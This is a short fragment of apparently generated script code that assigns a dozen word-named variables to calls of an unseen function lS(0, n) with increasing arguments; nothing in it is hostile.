pre_plays = lS(0, 4);
pre_Shakespeare = lS(0, 5);
pre_Shakespeare = lS(0, 6);
pre_worlds5 = lS(0, 7);
pre_well10 = lS(0, 8);
pre_absence = lS(0, 9);
pre_Like = lS(0, 10);
pre_have1 = lS(0, 11);
pre_Christopher4 = lS(0, 12);
pre_feathers = lS(0, 13);
pre_changed = lS(0, 14);
pre_clearly = lS(0, 15);